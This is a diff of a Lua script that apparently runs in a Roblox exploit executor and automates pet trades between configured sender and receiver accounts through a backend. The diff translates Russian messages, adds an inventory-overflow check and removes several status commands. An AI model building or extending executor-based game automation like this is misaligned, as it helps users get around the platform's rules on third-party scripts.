+            AddMessage("Server time: " .. response.stats.serverTime, "info")
+            AddMessage("=====================", "info")
         else
-            AddMessage("Ошибка подключения к бекенду", "error")
-        end
-
-        if response and response.success and response.stats and response.stats.serverTime then
-            AddMessage("Время сервера: " .. response.stats.serverTime, "info")
-        else
-            AddMessage("Не удалось получить время сервера", "warning")
+            AddMessage("Backend connection error", "error")
         end
     end
     
@@ -1620,9 +1652,9 @@ local function CreateCommands()
         end
         
         if isReceiver then
-            AddMessage("Текущая роль: Получатель (ожидаем отправителя)", "success")
+            AddMessage("Current role: Receiver (waiting for sender)", "success")
         else
-            AddMessage("Текущая роль: Отправитель (ищем получателя)", "info")
+            AddMessage("Current role: Sender (looking for receiver)", "info")
         end
     end
     
@@ -1670,9 +1702,33 @@ local function CreateCommands()
         AddMessage("=== Проверка питомцев в инвентаре ===", "info")
         
         local petsInInventory = GetPetsInInventory()
-        AddMessage("Всего питомцев в инвентаре: " .. #petsInInventory, "info")
+        local petsCount = #petsInInventory
+        AddMessage("Всего питомцев в инвентаре: " .. petsCount, "info")
         
-        if #petsInInventory == 0 then
+        -- Проверяем переполнение для получателей
+        local isReceiver = false
+        for _, username in pairs(getgenv().Config.Recipients) do
+            if username == LocalPlayer.Name then
+                isReceiver = true
+                break
+            end
+        end
+        
+        if isReceiver then
+            if petsCount > 55 then
+                AddMessage("⚠️ ПЕРЕПОЛНЕНИЕ ИНВЕНТАРЯ: " .. petsCount .. " питомцев!", "error")
+                AddMessage("Получатель отключен от бекенда из-за переполнения (>55 питомцев)", "warning")
+                AddMessage("Остаемся в игре, но не регистрируемся как получатель", "info")
+                AddMessage("Рекомендуется освободить инвентарь для возобновления работы", "warning")
+            elseif petsCount > 45 then
+                AddMessage("⚠️ ВНИМАНИЕ: Инвентарь почти полный: " .. petsCount .. " питомцев", "warning")
+                AddMessage("При достижении 55 питомцев получатель будет отключен от бекенда", "warning")
+            else
+                AddMessage("✅ Инвентарь в норме: " .. petsCount .. " питомцев", "success")
+            end
+        end
+        
+        if petsCount == 0 then
             AddMessage("❌ Нет питомцев в инвентаре!", "error")
             return
         end
@@ -1696,7 +1752,7 @@ local function CreateCommands()
         end
         
         AddMessage("=== Результат ===", "info")
-        AddMessage("Питомцев для трейда: " .. tradePetsCount .. "/" .. #petsInInventory, "info")
+        AddMessage("Питомцев для трейда: " .. tradePetsCount .. "/" .. petsCount, "info")
         
         if tradePetsCount > 0 then
             AddMessage("✅ Готов к трейду!", "success")
@@ -1710,169 +1766,6 @@ local function CreateCommands()
         end
         
         AddMessage("=======================", "info")
-    end
-    
-    local function CheckTradeQueue()
-        if not getgenv().Config.UseBackend then
-            AddMessage("Бекенд отключен, очередь недоступна", "warning")
-            return
-        end
-        
-        local url = getgenv().Config.BackendURL .. "/api/trade-queue"
-        local response = MakeHttpRequest(url, "GET")
-        
-        if response and response.success then
-            AddMessage("=== Очередь трейдов ===", "info")
-            AddMessage("Всего в очереди: " .. response.total, "info")
-            
-            if response.total > 0 then
-                for i, trade in pairs(response.queue) do
-                    AddMessage(i .. ". " .. trade.sender .. " -> " .. trade.receiver, "info")
-                    AddMessage("   Сервер: " .. trade.serverId, "info")
-                    AddMessage("   Время: " .. os.date("%H:%M:%S", trade.timestamp / 1000), "info")
-                end
-            else
-                AddMessage("Очередь пуста", "info")
-            end
-            
-            AddMessage("=====================", "info")
-        else
-            AddMessage("Ошибка получения очереди трейдов", "error")
-        end
-    end
-    
-    local function CheckReceiversStatus()
-        if not getgenv().Config.UseBackend then
-            AddMessage("Бекенд отключен, статус недоступен", "warning")
-            return
-        end
-        
-        local url = getgenv().Config.BackendURL .. "/api/receivers"
-        local response = MakeHttpRequest(url, "GET")
-        
-        if response and response.success then
-            AddMessage("=== Статус получателей ===", "info")
-            
-            local waitingCount = 0
-            local completedCount = 0
-            
-            for i, receiver in pairs(response.receivers) do
-                local status = receiver.status == "waiting" and "✅ Ожидает" or "✅ Завершен"
-                AddMessage(i .. ". " .. receiver.username .. " - " .. status, "info")
-                AddMessage("   Питомцев: " .. receiver.petsCount .. "/" .. receiver.maxPets, "info")
-                AddMessage("   Сервер: " .. receiver.serverId, "info")
-                
-                if receiver.status == "waiting" then
-                    waitingCount = waitingCount + 1
-                else
-                    completedCount = completedCount + 1
-                end
-            end
-            
-            AddMessage("=== Итого ===", "info")
-            AddMessage("Ожидающих: " .. waitingCount, "info")
-            AddMessage("Завершенных: " .. completedCount, "info")
-            AddMessage("=======================", "info")
-        else
-            AddMessage("Ошибка получения статуса получателей", "error")
-        end
-    end
-    
-    local function RequestTradeServerCommand(targetReceiver)
-        if not targetReceiver then
-            AddMessage("Укажите имя получателя", "error")
-            return
-        end
-        
-        if not getgenv().Config.UseBackend then
-            AddMessage("Бекенд отключен", "warning")
-            return
-        end
-        
-        AddMessage("Присоединение к обычному серверу для трейда с " .. targetReceiver .. "...", "info")
-        
-        if JoinNormalServer() then
-            AddMessage("Присоединение к серверу запущено!", "success")
-            AddMessage("Ожидание загрузки сервера...", "info")
-        else
-            AddMessage("Ошибка присоединения к серверу", "error")
-        end
-    end
-    
-    local function SetMaxPetsPerAccount(maxPets)
-        if not maxPets or type(maxPets) ~= "number" then
-            AddMessage("Укажите число питомцев (например: SetMaxPetsPerAccount(55))", "error")
-            return
-        end
-        
-        getgenv().Config.MaxPetsPerAccount = maxPets
-        AddMessage("Максимальное количество питомцев на аккаунт установлено: " .. maxPets, "success")
-    end
-    
-    local function SetTradeTimeout(timeout)
-        if not timeout or type(timeout) ~= "number" then
-            AddMessage("Укажите таймаут в секундах (например: SetTradeTimeout(300))", "error")
-            return
-        end
-        
-        getgenv().Config.TradeTimeout = timeout
-        AddMessage("Таймаут трейда установлен: " .. timeout .. " секунд", "success")
-    end
-    
-    local function ToggleAutoRejoinOnVipServer()
-        getgenv().Config.AutoRejoinOnVipServer = not getgenv().Config.AutoRejoinOnVipServer
-        AddMessage("Авто переход с VIP серверов: " .. (getgenv().Config.AutoRejoinOnVipServer and "Включен" or "Выключен"), "info")
-    end
-    
-    local function CheckConnectionStatus()
-        AddMessage("=== Статус соединения ===", "info")
-        AddMessage("LocalPlayer: " .. (LocalPlayer and "✅" or "❌"), "info")
-        AddMessage("Character: " .. (LocalPlayer and LocalPlayer.Character and "✅" or "❌"), "info")
-        
-        local connection = game:GetService("NetworkClient")
-        AddMessage("NetworkClient: " .. (connection and "✅" or "❌"), "info")
-        AddMessage("Connection: " .. (connection and connection.Connection and "✅" or "❌"), "info")
-        
-        local teleportState = TeleportService:GetLocalPlayerTeleportData()
-        AddMessage("Teleporting: " .. (teleportState and teleportState.teleporting and "✅" or "❌"), "info")
-        
-        AddMessage("Стабильность соединения: " .. (IsConnectionStable() and "✅ Стабильно" or "❌ Нестабильно"), "info")
-        AddMessage("=======================", "info")
-    end
-    
-    local function WaitForConnection(timeout)
-        timeout = timeout or 30
-        AddMessage("Ожидание стабильного соединения...", "info")
-        
-        if WaitForStableConnection(timeout) then
-            AddMessage("Соединение стабилизировано!", "success")
-            return true
-        else
-            AddMessage("Не удалось стабилизировать соединение за " .. timeout .. " секунд", "error")
-            return false
-        end
-    end
-    
-    local function CheckBackendAvailability()
-        if not getgenv().Config.UseBackend then
-            AddMessage("Бекенд отключен в конфигурации", "warning")
-            return false
-        end
-        
-        AddMessage("Проверка доступности бекенда...", "info")
-        
-        if IsBackendAvailable() then
-            AddMessage("✅ Бекенд доступен!", "success")
-            return true
-        else
-            AddMessage("❌ Бекенд недоступен", "error")
-            return false
-        end
-    end
-    
-    local function WaitForBackendCommand(timeout)
-        timeout = timeout or 60
-        return WaitForBackend(timeout)
     end
     
     local function ToggleSkipTeleportIfNoPets()
@@ -1914,6 +1807,8 @@ local function CreateCommands()
     _G.ShowConfig = ShowConfig
     _G.ToggleBackend = ToggleBackend
     _G.ToggleAutoTeleport = ToggleAutoTeleport
+    _G.ToggleSmartServerSearch = ToggleSmartServerSearch
+    _G.PreviewBestServer = PreviewBestServer
     _G.CheckBackendStatus = CheckBackendStatus
     _G.RegisterReceiver = RegisterReceiver
     _G.UnregisterReceiver = UnregisterReceiver
@@ -1925,18 +1820,6 @@ local function CreateCommands()
     _G.ToggleSkipTeleportIfNoPets = ToggleSkipTeleportIfNoPets
     _G.ToggleLeaveServerAfterTrade = ToggleLeaveServerAfterTrade
     _G.ForceLeaveServer = ForceLeaveServer
-    _G.CheckTradeQueue = CheckTradeQueue
-    _G.CheckReceiversStatus = CheckReceiversStatus
-    _G.RequestTradeServerCommand = RequestTradeServerCommand
-    _G.SetMaxPetsPerAccount = SetMaxPetsPerAccount
-    _G.SetTradeTimeout = SetTradeTimeout
-    _G.ToggleAutoRejoinOnVipServer = ToggleAutoRejoinOnVipServer
-    _G.CheckConnectionStatus = CheckConnectionStatus
-    _G.WaitForConnection = WaitForConnection
-    _G.CheckBackendAvailability = CheckBackendAvailability
-    _G.WaitForBackendCommand = WaitForBackendCommand
-    _G.DisableBackendOnError = DisableBackendOnError
-    _G.ForceRejoinOnServerClose = ForceRejoinOnServerClose
     
     AddMessage("=== Авто трейд скрипт загружен ===", "success")
     
@@ -1954,43 +1837,6 @@ local function CreateCommands()
     else
         AddMessage("РОЛЬ: Отправитель (ищем получателя)", "info")
     end
-    
-    AddMessage("Команды:", "info")
-    AddMessage("ToggleAutoTrade() - включить/выключить авто трейд", "info")
-    AddMessage("SetTargetPlayer('username') - установить одного целевого игрока", "info")
-    AddMessage("AddRecipient('username') - добавить получателя в список", "info")
-    AddMessage("RemoveRecipient('username') - удалить получателя из списка", "info")
-    AddMessage("ShowRecipients() - показать список получателей", "info")
-    AddMessage("AddPetToTradeList('PetName') - добавить питомца в список", "info")
-    AddMessage("RemovePetFromTradeList('PetName') - удалить питомца из списка", "info")
-    AddMessage("ShowConfig() - показать текущую конфигурацию", "info")
-    AddMessage("ToggleBackend() - включить/выключить бекенд", "info")
-    AddMessage("ToggleAutoTeleport() - включить/выключить автотелепорт", "info")
-    AddMessage("CheckBackendStatus() - проверить статус бекенда", "info")
-    AddMessage("RegisterReceiver() - зарегистрироваться как получатель", "info")
-    AddMessage("UnregisterReceiver() - удалить регистрацию получателя", "info")
-    AddMessage("UpdateReceiver() - обновить статус получателя", "info")
-    AddMessage("CheckRole() - проверить текущую роль", "info")
-    AddMessage("CheckServerStatus() - проверить статус сервера", "info")
-    AddMessage("ForceRejoinNormal() - принудительно перейти на обычный сервер (только получатели)", "info")
-    AddMessage("CheckInventoryPets() - проверить питомцев в инвентаре", "info")
-    AddMessage("ToggleSkipTeleportIfNoPets() - включить/выключить пропуск телепорта без питомцев", "info")
-    AddMessage("ToggleLeaveServerAfterTrade() - включить/выключить выход с сервера после трейда", "info")
-    AddMessage("ForceLeaveServer() - принудительно выйти с сервера (только отправители)", "info")
-    AddMessage("CheckTradeQueue() - проверить очередь трейдов", "info")
-    AddMessage("CheckReceiversStatus() - проверить статус получателей", "info")
-    AddMessage("RequestTradeServerCommand('username') - присоединиться к серверу для трейда", "info")
-    AddMessage("SetMaxPetsPerAccount(number) - установить макс. питомцев на аккаунт", "info")
-    AddMessage("SetTradeTimeout(seconds) - установить таймаут трейда", "info")
-    AddMessage("ToggleAutoRejoinOnVipServer() - включить/выключить авто переход с VIP серверов", "info")
-    AddMessage("CheckConnectionStatus() - проверить статус соединения", "info")
-    AddMessage("WaitForConnection(timeout) - ожидать стабильного соединения", "info")
-    AddMessage("CheckBackendAvailability() - проверить доступность бекенда", "info")
-    AddMessage("WaitForBackendCommand(timeout) - ожидать доступности бекенда", "info")
-    AddMessage("DisableBackendOnError() - отключить бекенд при ошибках", "info")
-    AddMessage("ForceRejoinOnServerClose() - принудительно перейти на новый сервер", "info")
-    AddMessage("=====================================", "info")
-    AddMessage("Текущий список получателей:", "info")
     for i, player in pairs(getgenv().Config.Recipients) do
         AddMessage(i .. ". " .. player, "info")
     end
@@ -2001,13 +1847,7 @@ local function CreateCommands()
     
     -- Проверяем статус бекенда при запуске
     if getgenv().Config.UseBackend then
-        task.wait(2) -- Небольшая задержка для стабилизации
-        if not CheckBackendAvailability() then
-            AddMessage("⚠️ Бекенд недоступен при запуске!", "warning")
-            AddMessage("Используйте DisableBackendOnError() для отключения", "info")
-        else
-            CheckBackendStatus()
-        end
+        CheckBackendStatus()
     end
     
     -- Проверяем статус сервера при запуске
@@ -2025,11 +1865,9 @@ local function CreateCommands()
     
     if isReceiver then
         -- Получатели переходят с VIP серверов
-        if IsVipServer() and getgenv().Config.AutoRejoinOnVipServer then
+        if IsVipServer() then
             AddMessage("Получатель: автоматический переход с VIP сервера на обычный...", "warning")
             RejoinNormalServer()
-        elseif IsVipServer() and not getgenv().Config.AutoRejoinOnVipServer then
-            AddMessage("Получатель: VIP сервер, авто переход отключен", "info")
         end
     else
         -- Отправители остаются на своих серверах
